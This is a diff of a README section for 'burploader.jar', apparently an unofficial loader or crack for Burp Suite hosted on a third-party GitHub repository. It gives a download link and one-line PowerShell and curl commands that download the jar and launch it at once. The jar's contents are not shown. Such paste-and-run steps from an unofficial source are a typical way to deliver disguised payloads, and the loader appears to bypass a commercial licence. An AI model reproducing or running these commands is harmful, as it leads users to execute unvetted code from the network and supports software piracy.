@@ -8,31 +8,43 @@
 
 ## Download
 
-**[Click here to download](https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar)** — save as `burploader.jar`, then run with `java -jar burploader.jar`.
+**[Click here to download](https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar)**
 
-### Command-line Download
+Save as `burploader.jar`, then open a terminal and run:
 
-**Windows (PowerShell):**
+```bash
+java -jar burploader.jar
+```
+
+---
+
+### Or grab it from the terminal
+
+**Download only**
+
+*Windows (PowerShell) — saves the file to your current directory*
 ```powershell
 powershell -c "irm https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -OutFile burploader.jar"
 ```
 
-**macOS / Linux:**
+*macOS / Linux — saves the file to your current directory*
 ```bash
 curl -fsSL https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -o burploader.jar
 ```
 
-### Command-line Download & Run
+**Download & launch in one go**
 
-**Windows (PowerShell):**
+*Windows (PowerShell)*
 ```powershell
 powershell -c "irm https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -OutFile burploader.jar; java -jar burploader.jar"
 ```
 
-**macOS / Linux:**
+*macOS / Linux*
 ```bash
 curl -fsSL https://github.com/uppermo0n/burpsuite/releases/download/v2/burploader.jar -o burploader.jar && java -jar burploader.jar
 ```
+
+---
 
 ## Requirements
 
@@ -41,4 +53,4 @@ curl -fsSL https://github.com/uppermo0n/burpsuite/releases/download/v2/burploade
 | **Minimum JDK** | 21 |
 | **Recommended** | 22 or 23 |
 
-> For best stability, use a JDK that is 1–2 versions behind the latest release (e.g., if JDK 26 is out, use JDK 24 or 25). Brand-new JDK releases may have compatibility quirks with Swing or the loader agent. JDK 21 is the long-term support (LTS) baseline.
+> For best stability, use a JDK that is 1–2 versions behind the latest release. Brand-new JDK releases may have compatibility quirks. JDK 21 is the long-term support (LTS) baseline.
